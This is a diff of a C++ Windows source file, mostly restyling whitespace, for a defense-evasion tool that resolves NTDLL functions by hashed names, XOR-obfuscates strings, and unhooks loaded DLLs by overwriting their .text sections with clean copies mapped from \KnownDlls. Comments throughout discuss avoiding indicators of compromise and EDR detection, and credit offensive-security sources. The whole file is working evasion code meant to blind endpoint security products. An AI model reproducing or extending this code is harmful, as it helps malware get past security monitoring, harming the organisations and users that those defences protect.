@@ -15,20 +15,20 @@ constexpr auto CACHE = 10;              // specify size of CACHE array
 #define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )  
                                                                 // Credit to modexp for the idea
 template <typename Type>                                        // @JonasLyk said constexpr func -> template -> macro
-inline Type RVA2VA(LPVOID Base, LONG Rva) {
+inline Type RVA2VA( LPVOID Base, LONG Rva ) {
     return (Type)((ULONG_PTR)Base + Rva);
 }
 template <typename T>
-void SWAP(T &x, T  &y) {                                        // Inlined on any /O flag by compiler D:
+void SWAP( T& x, T& y ) {                                        // Inlined on any /O flag by compiler D:
     T t = x;
-    x = y;                                  
+    x = y;
     y = t;
 }
 
 #define TOKENIZE( x ) #x
 #define CONCAT( X, Y ) X##Y
 
-#if _DEBUG == 0
+#if _DEBUG == 1
 #define PRINT( STR, ... )
 #else
 #define PRINT( STR, ... )                                                                   \
@@ -46,37 +46,37 @@ void SWAP(T &x, T  &y) {                                        // Inlined on an
 
 #pragma region helpers
 // Careful about buffer overflow
-wchar_t* _strcpy(wchar_t* dest, const wchar_t* src);
+wchar_t* _strcpy( wchar_t* dest, const wchar_t* src );
 
-wchar_t* _strcat(wchar_t* dest, const wchar_t* src);
+wchar_t* _strcat( wchar_t* dest, const wchar_t* src );
 
-void _memcpy(void* dst, const void* src, SIZE_T count);
+void _memcpy( void* dst, const void* src, SIZE_T count );
 
-__forceinline char upper(char c);
+__forceinline char upper( char c );
 #pragma endregion
 
 #pragma region hashing
 #pragma region HashStringDjb2
 // https://github.com/vxunderground/VX-API/blob/main/VX-API/MalwareStrings.h
-constexpr DWORD HashStringDjb2(const char* String)
+constexpr DWORD HashStringDjb2( const char* String )
 {
     ULONG Hash = 5381;
     INT c = 0;
 
-    while ((c = *String++)) {
+    while( (c = *String++) ) {
         Hash = ((Hash << 5) + Hash) + c;
     }
 
     return Hash;
 }
 
-constexpr DWORD HashStringDjb2(const wchar_t* String)
+constexpr DWORD HashStringDjb2( const wchar_t* String )
 
 {
     ULONG Hash = 5381;
     INT c = 0;
 
-    while ((c = *String++)) {
+    while( (c = *String++) ) {
         Hash = ((Hash << 5) + Hash) + c;
     }
 
@@ -86,11 +86,11 @@ constexpr DWORD HashStringDjb2(const wchar_t* String)
 
 #pragma region HashStringFowlerNollVoVariant1a
 
-constexpr ULONG HashStringFowlerNollVoVariant1a(const char* String)
+constexpr ULONG HashStringFowlerNollVoVariant1a( const char* String )
 {
     ULONG Hash = 0x811c9dc5;
 
-    while (*String)
+    while( *String )
     {
         Hash ^= (UCHAR)*String++;
         Hash *= 0x01000193;
@@ -99,11 +99,11 @@ constexpr ULONG HashStringFowlerNollVoVariant1a(const char* String)
     return Hash;
 }
 
-constexpr ULONG HashStringFowlerNollVoVariant1a(const wchar_t* String)
+constexpr ULONG HashStringFowlerNollVoVariant1a( const wchar_t* String )
 {
     ULONG Hash = 0x811c9dc5;
 
-    while (*String)
+    while( *String )
     {
         Hash ^= (UCHAR)*String++;
         Hash *= 0x01000193;
@@ -113,9 +113,9 @@ constexpr ULONG HashStringFowlerNollVoVariant1a(const wchar_t* String)
 }
 #pragma endregion
 
-inline void InitModules(void*);
+inline void InitModules( void* );
 
-void* GetProcAddrH(UINT moduleHash, UINT funcHash);
+void* GetProcAddrH( UINT moduleHash, UINT funcHash );
 
 #pragma region macros
 #define hash( VAL ) constexpr auto CONCAT( hash, VAL ) = HASHALGO( TOKENIZE( VAL ) );							
@@ -129,14 +129,14 @@ hash( FUNCNAME ) typedef RETTYPE( WINAPI* CONCAT( type, FUNCNAME ) )( __VA_ARGS_
 CONCAT( hash,FUNCNAME ) ) )			
 
 
-dllhash(KERNEL32, L"KERNEL32.DLL")
-dllhash(NTDLL, L"NTDLL.DLL")
+dllhash( KERNEL32, L"KERNEL32.DLL" )
+dllhash( NTDLL, L"NTDLL.DLL" )
 
-hashFunc(NtUnmapViewOfSection, NTSTATUS, HANDLE, PVOID);
-hashFunc(NtProtectVirtualMemory, NTSTATUS, HANDLE, PVOID*, PULONG, ULONG, PULONG);
-hashFunc(NtOpenSection, NTSTATUS, HANDLE*, ACCESS_MASK, OBJECT_ATTRIBUTES*);
-hashFunc(NtMapViewOfSection, NTSTATUS, HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
-hashFunc(RtlInitUnicodeString, VOID, PUNICODE_STRING, PCWSTR);
+hashFunc( NtUnmapViewOfSection, NTSTATUS, HANDLE, PVOID );
+hashFunc( NtProtectVirtualMemory, NTSTATUS, HANDLE, PVOID*, PULONG, ULONG, PULONG );
+hashFunc( NtOpenSection, NTSTATUS, HANDLE*, ACCESS_MASK, OBJECT_ATTRIBUTES* );
+hashFunc( NtMapViewOfSection, NTSTATUS, HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG );
+hashFunc( RtlInitUnicodeString, VOID, PUNICODE_STRING, PCWSTR );
 #pragma endregion 
 
 #pragma endregion
@@ -144,12 +144,12 @@ hashFunc(RtlInitUnicodeString, VOID, PUNICODE_STRING, PCWSTR);
 #pragma region core
 void CheckCommonlyHooked();
 
-LPVOID RetrieveKnownDll(PWSTR name);
+LPVOID RetrieveKnownDll( PWSTR name );
 #pragma endregion
 
 
 #pragma region random
-constexpr int RandomSeed(void)
+constexpr int RandomSeed( void )
 {
     return '0' * -40271 + // offset accounting for digits' ANSI offsets
         __TIME__[7] * 1 +
@@ -167,19 +167,19 @@ template <typename T, unsigned int N>
 struct obfuscator {
 
     T m_data[N] = { 0 };
-    
-    constexpr obfuscator(const T* data) {
-        for (unsigned int i = 0; i < N; i++) {
+
+    constexpr obfuscator( const T* data ) {
+        for( unsigned int i = 0; i < N; i++ ) {
             m_data[i] = (data[i] ^ (KEY));
         }
     }
 
-    void deobfuscate(T* des) const {
+    void deobfuscate( T* des ) const {
         int i = 0;
         do {
             des[i] = (m_data[i] ^ (KEY));
             i++;
-        } while (des[i - 1]);
+        } while( des[i - 1] );
     }
 };
 
@@ -241,111 +241,110 @@ USHORT hashPointer;
 * Return:
 * * 0       - All cases
 */
-int entry()
+int entry(PPEB peb)
 {
 
-    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
     LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
     LIST_ENTRY* next = head->Flink;
     LPVOID ntdll = NULL;
 
     // Calling as requested by InitModules contest
-    InitModules(head);
+    InitModules( head );
 
 #if _DEBUG == 1
     CheckCommonlyHooked();
 #endif
 
-    while (next != head)
+    while( next != head )
     {
-        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((PBYTE)next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
+        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((PBYTE)next - offsetof( LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ));
         UNICODE_STRING* fullname = &entry->FullDllName;
-        UNICODE_STRING* basename = (UNICODE_STRING*)((PBYTE)fullname + sizeof(UNICODE_STRING));
+        UNICODE_STRING* basename = (UNICODE_STRING*)((PBYTE)fullname + sizeof( UNICODE_STRING ));
 
-        LPVOID addr = RetrieveKnownDll(basename->Buffer);
+        LPVOID addr = RetrieveKnownDll( basename->Buffer );
         UINT uhash = 0;
         char  name[64];
-        if (basename->Length < sizeof(name) - 1) {
+        if( basename->Length < sizeof( name ) - 1 ) {
             int i = 0;
-            while (basename->Buffer[i] && i < sizeof(name) - 1)
+            while( basename->Buffer[i] && i < sizeof( name ) - 1 )
             {
-                name[i] = upper((char)basename->Buffer[i]);	// can never be sure so uppercase
+                name[i] = upper( (char)basename->Buffer[i] );	// can never be sure so uppercase
                 i++;
             }
             name[i] = 0;
-            uhash = HASHALGO(name);
-            if (uhash == hashNTDLL) {
+            uhash = HASHALGO( name );
+            if( uhash == hashNTDLL ) {
                 ntdll = addr;                                       // ntdll holds \\KnownDlls\\ntdll.dll
-                if (entry->DllBase == ModuleHashes[0].addr) {
-                    SWAP(ntdll, ModuleHashes[0].addr);
+                if( entry->DllBase == ModuleHashes[0].addr ) {
+                    SWAP( ntdll, ModuleHashes[0].addr );
                     hashPointer = 0;
                 }
             }
         }
 
-        if (addr)
+        if( addr )
         {
             HMODULE module = (HMODULE)entry->DllBase;
 
             PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)entry->DllBase;
-            PIMAGE_NT_HEADERS nt = RVA2VA<PIMAGE_NT_HEADERS>(entry->DllBase, dos->e_lfanew);
+            PIMAGE_NT_HEADERS nt = RVA2VA<PIMAGE_NT_HEADERS>( entry->DllBase, dos->e_lfanew );
 
             // https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
-            for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+            for( int i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {
                 PIMAGE_SECTION_HEADER section =
-                    (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt) +
+                    (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION( nt ) +
                         ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
 
 
                 // thanks to modexp for the idea
                 // | 0x20202020 is lowercasing the text
                 // xet. is .tex in little endian
-                if ((*(ULONG*)section->Name | 0x20202020) == 'xet.') {
+                if( (*(ULONG*)section->Name | 0x20202020) == 'xet.' ) {
                     ULONG dw;
-                    PVOID base = RVA2VA<LPVOID>(module, section->VirtualAddress);
+                    PVOID base = RVA2VA<LPVOID>( module, section->VirtualAddress );
                     ULONG size = section->Misc.VirtualSize;
 
                     // It's not a trivial task to make the DLL RW only especially in the case of NTDLL as we'll be using 
                     // various NT functions. PAGE_EXECUTE_READWRITE is a potential IOC.
                     // I leave that as a task to the reader to get around this.
                     // It is also worth nothing NtProtectVirtualMemory could be hooked.
-                    if (NT_SUCCESS(API(NTDLL,NtProtectVirtualMemory)(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &dw))) {
+                    if( NT_SUCCESS( API( NTDLL, NtProtectVirtualMemory )(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &dw) ) ) {
 
                         // Replacing all the DLLs with an unhooked version is a potential IOC if EDRs scan for unhooked DLLs
                         // Consider storing the hooked .text sections encrypted in an allocated buffer and restoring when
                         //  you are done.
                         _memcpy(
-                            RVA2VA<LPVOID>(module, section->VirtualAddress),
-                            RVA2VA<LPVOID>(addr, section->VirtualAddress),
+                            RVA2VA<LPVOID>( module, section->VirtualAddress ),
+                            RVA2VA<LPVOID>( addr, section->VirtualAddress ),
                             section->Misc.VirtualSize
                         );
 
                         // Restore original memory permissions
-                        API(NTDLL,NtProtectVirtualMemory)(
+                        API( NTDLL, NtProtectVirtualMemory )(
                             NtCurrentProcess(),
                             &base,
                             &size,
                             dw,
                             &dw
-                        );
+                            );
 
-                        PRINT(L"[ ] Unhooked %s from \\KnownDlls\\%s \n", basename->Buffer, basename->Buffer);
+                        PRINT( L"[ ] Unhooked %s from \\KnownDlls\\%s \n", basename->Buffer, basename->Buffer );
                     }
                 }
             }
 
-            if (basename->Length < sizeof(name) - 1) {
+            if( basename->Length < sizeof( name ) - 1 ) {
 
             }
-            if (uhash == hashNTDLL) {
-                if (addr == ModuleHashes[0].addr) {
-                    SWAP(ntdll, ModuleHashes[0].addr);
+            if( uhash == hashNTDLL ) {
+                if( addr == ModuleHashes[0].addr ) {
+                    SWAP( ntdll, ModuleHashes[0].addr );
                     hashPointer = 0;            // We don't want it to point towards our \\KnownDlls\\ntdll.dll looked up functions
                 }
             }
 
             // Unmap pointer as required by RetrieveKnownDll
-            API(NTDLL,NtUnmapViewOfSection)(NtCurrentProcess(), addr);
+            API( NTDLL, NtUnmapViewOfSection )(NtCurrentProcess(), addr);
         }
         next = next->Flink;
     }
@@ -393,13 +392,13 @@ void CheckCommonlyHooked()
 
     };
 
-    for (int i = 0; i < 4; i++) {
-        hashes[i].addr = GetProcAddrH(hashNTDLL, hashes[i].Hash);
-        if (*(ULONG*)hashes[i].addr != 0xb8d18b4c) {
-            PRINT(L"[!] Hooked Function at 0x%p\n", hashes[i].addr);
+    for( int i = 0; i < 4; i++ ) {
+        hashes[i].addr = GetProcAddrH( hashNTDLL, hashes[i].Hash );
+        if( *(ULONG*)hashes[i].addr != 0xb8d18b4c ) {
+            PRINT( L"[!] Hooked Function at 0x%p\n", hashes[i].addr );
         }
         else {
-            PRINT(L"[-] Function Not Hooked at 0x%p\n", hashes[i].addr);
+            PRINT( L"[-] Function Not Hooked at 0x%p\n", hashes[i].addr );
         }
     }
 }
@@ -419,7 +418,7 @@ void CheckCommonlyHooked()
 * * LPVOID      - to mapped \KnownDlls\@arg1
 * * NULL        - No valid \KnownDlls\ DLL was found
 */
-LPVOID RetrieveKnownDll(PWSTR name)
+LPVOID RetrieveKnownDll( PWSTR name )
 {
 
 
@@ -432,13 +431,13 @@ LPVOID RetrieveKnownDll(PWSTR name)
     NTSTATUS status;
 
     WCHAR buffer[MAX_PATH];
-    _strcpy(buffer, OBFW(L"\\KnownDlls\\"));    // Potential IOC 
-    _strcat(buffer, name);
+    _strcpy( buffer, OBFW( L"\\KnownDlls\\" ) );    // Potential IOC 
+    _strcat( buffer, name );
 
-    API(NTDLL,RtlInitUnicodeString)(
+    API( NTDLL, RtlInitUnicodeString )(
         &uni,
         buffer
-    );
+        );
     InitializeObjectAttributes(
         &oa,
         &uni,
@@ -447,10 +446,10 @@ LPVOID RetrieveKnownDll(PWSTR name)
         NULL
     );
 
-    if (!NT_SUCCESS(API(NTDLL,NtOpenSection)(&section, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa)))
+    if( !NT_SUCCESS( API( NTDLL, NtOpenSection )(&section, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa) ) )
         goto cleanup;
 
-    if (!NT_SUCCESS(API(NTDLL,NtMapViewOfSection)(section, NtCurrentProcess(), &addr, 0, 0, NULL, &size, 1, 0, PAGE_READONLY)))
+    if( !NT_SUCCESS( API( NTDLL, NtMapViewOfSection )(section, NtCurrentProcess(), &addr, 0, 0, NULL, &size, 1, 0, PAGE_READONLY) ) )
         goto cleanup;
 
 cleanup:
@@ -459,18 +458,18 @@ cleanup:
 #pragma endregion
 
 #pragma region helpers
-wchar_t* _strcpy(wchar_t* dest, const wchar_t* src)
+wchar_t* _strcpy( wchar_t* dest, const wchar_t* src )
 {
     wchar_t* p;
 
-    if ((dest == NULL) || (src == NULL))
+    if( (dest == NULL) || (src == NULL) )
         return dest;
 
-    if (dest == src)
+    if( dest == src )
         return dest;
 
     p = dest;
-    while (*src != 0) {
+    while( *src != 0 ) {
         *p = *src;
         p++;
         src++;
@@ -480,15 +479,15 @@ wchar_t* _strcpy(wchar_t* dest, const wchar_t* src)
     return dest;
 }
 
-wchar_t* _strcat(wchar_t* dest, const wchar_t* src)
+wchar_t* _strcat( wchar_t* dest, const wchar_t* src )
 {
-    if ((dest == NULL) || (src == NULL))
+    if( (dest == NULL) || (src == NULL) )
         return dest;
 
-    while (*dest != 0)
+    while( *dest != 0 )
         dest++;
 
-    while (*src != 0) {
+    while( *src != 0 ) {
         *dest = *src;
         dest++;
         src++;
@@ -498,16 +497,16 @@ wchar_t* _strcat(wchar_t* dest, const wchar_t* src)
     return dest;
 }
 
-void _memcpy(void* dst, const void* src, SIZE_T count) {
-    for (volatile int i = 0; i < count; i++) {
+void _memcpy( void* dst, const void* src, SIZE_T count ) {
+    for( volatile int i = 0; i < count; i++ ) {
         ((BYTE*)dst)[i] = ((BYTE*)src)[i];
     }
 }
 
 
-__forceinline char upper(char c)
+__forceinline char upper( char c )
 {
-    if (c >= 'a' && c <= 'z') {
+    if( c >= 'a' && c <= 'z' ) {
         return c - 'a' + 'A';
     }
 
@@ -520,57 +519,57 @@ __forceinline char upper(char c)
 * GetProcAddrH() - Retrieve process address given the hash of a module and a corresponding function export hash
 * @moduleHash: hash of module (hashMODULE)
 * @funcHash: hash of the function (hashFUNCTION)
-* 
-* Validates that the module hash is present in the ModuleHashes structure. If so it walks the export directory 
+*
+* Validates that the module hash is present in the ModuleHashes structure. If so it walks the export directory
 * hashing all the names of the exports until it finds the corresponding function hash. The hash is then cached
 * in the circular array HashCache which is indexed with hashPointer.
-* 
+*
 * Context:  API(MODULE,FUNC) macro
 *           Determing whether an address is hooked or not.
 * Return:
 * * void*       - pointer to exported function in specified module
 * * NULL        - in event of failure
 */
-void* GetProcAddrH(UINT moduleHash, UINT funcHash)
+void* GetProcAddrH( UINT moduleHash, UINT funcHash )
 {
     void* base = nullptr;
-    for (auto i : ModuleHashes) {
-        if (i.Hash == moduleHash) {
+    for( auto i : ModuleHashes ) {
+        if( i.Hash == moduleHash ) {
             base = i.addr;
         }
     }
-    if (base == NULL) {
+    if( base == NULL ) {
         return NULL;
     }
 
 
-    for (DWORD i = 0; i < CACHE; i++)
+    for( DWORD i = 0; i < CACHE; i++ )
     {
-        if (funcHash == HashCache[i].Hash) {
+        if( funcHash == HashCache[i].Hash ) {
             return HashCache[i].addr;
         }
     }
 
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
-    PIMAGE_NT_HEADERS nt = RVA2VA<PIMAGE_NT_HEADERS>(base, dos->e_lfanew);
+    PIMAGE_NT_HEADERS nt = RVA2VA<PIMAGE_NT_HEADERS>( base, dos->e_lfanew );
 
-    PIMAGE_EXPORT_DIRECTORY exports = RVA2VA<PIMAGE_EXPORT_DIRECTORY>(base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-    if (exports->AddressOfNames != 0)
+    PIMAGE_EXPORT_DIRECTORY exports = RVA2VA<PIMAGE_EXPORT_DIRECTORY>( base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
+    if( exports->AddressOfNames != 0 )
     {
-        PWORD ordinals = RVA2VA<PWORD>(base, exports->AddressOfNameOrdinals);
-        PDWORD names = RVA2VA<PDWORD>(base, exports->AddressOfNames);
-        PDWORD functions = RVA2VA<PDWORD>(base, exports->AddressOfFunctions);
+        PWORD ordinals = RVA2VA<PWORD>( base, exports->AddressOfNameOrdinals );
+        PDWORD names = RVA2VA<PDWORD>( base, exports->AddressOfNames );
+        PDWORD functions = RVA2VA<PDWORD>( base, exports->AddressOfFunctions );
 
-        for (DWORD i = 0; i < exports->NumberOfNames; i++) {
-            LPSTR name = RVA2VA<LPSTR>(base, names[i]);
-            if (HASHALGO(name) == funcHash) {
-                PBYTE function = RVA2VA<PBYTE>(base, functions[ordinals[i]]);
-                
+        for( DWORD i = 0; i < exports->NumberOfNames; i++ ) {
+            LPSTR name = RVA2VA<LPSTR>( base, names[i] );
+            if( HASHALGO( name ) == funcHash ) {
+                PBYTE function = RVA2VA<PBYTE>( base, functions[ordinals[i]] );
+
                 // Cache the result in a circular array
                 HashCache[hashPointer % CACHE].addr = function;
                 HashCache[hashPointer % CACHE].Hash = funcHash;
                 hashPointer = (hashPointer + 1) % CACHE;
-                
+
                 return function;
             }
         }
@@ -582,46 +581,46 @@ void* GetProcAddrH(UINT moduleHash, UINT funcHash)
 /**
 * InitModules() - Populate the ModuleHashes structure with the base addresses of the specified modules
 * @headi1 - InMemoryOrderModuleList first entry
-* 
-* Populates the ModuleHashes structure with the necessary DllBases required by checking against the 
+*
+* Populates the ModuleHashes structure with the necessary DllBases required by checking against the
 * respective module hash. Initializes the HashCache array and sets the hashPointer to 0 ready to be used.
-* 
+*
 * Context: Initialization. Before any hashed APIs are called.
-* 
+*
 */
-inline void InitModules(void* headi1)
+inline void InitModules( void* headi1 )
 {
 
     LIST_ENTRY* head = (LIST_ENTRY*)headi1;
     LIST_ENTRY* next = head->Flink;
 
-    while (next != head)
+    while( next != head )
     {
-        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((PBYTE)next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
+        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((PBYTE)next - offsetof( LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ));
 
         UNICODE_STRING* fullname = &entry->FullDllName;
-        UNICODE_STRING* basename = (UNICODE_STRING*)((PBYTE)fullname + sizeof(UNICODE_STRING));
+        UNICODE_STRING* basename = (UNICODE_STRING*)((PBYTE)fullname + sizeof( UNICODE_STRING ));
 
         char  name[64];
-        if (basename->Length < sizeof(name) - 1)
+        if( basename->Length < sizeof( name ) - 1 )
         {
             int i = 0;
-            while (basename->Buffer[i] && i < sizeof(name) - 1)
+            while( basename->Buffer[i] && i < sizeof( name ) - 1 )
             {
-                name[i] = upper((char)basename->Buffer[i]);	// can never be sure so uppercase
+                name[i] = upper( (char)basename->Buffer[i] );	// can never be sure so uppercase
                 i++;
             }
             name[i] = 0;
-            UINT hash = HASHALGO(name);
-            for (auto& i : ModuleHashes) {
-                if (i.Hash == hash) {
+            UINT hash = HASHALGO( name );
+            for( auto& i : ModuleHashes ) {
+                if( i.Hash == hash ) {
                     i.addr = entry->DllBase;
                 }
             }
         }
         next = next->Flink;
     }
-    RtlSecureZeroMemory(HashCache, sizeof(HashCache));
+    RtlSecureZeroMemory( HashCache, sizeof( HashCache ) );
     hashPointer = 0;
 }
 #pragma endregion
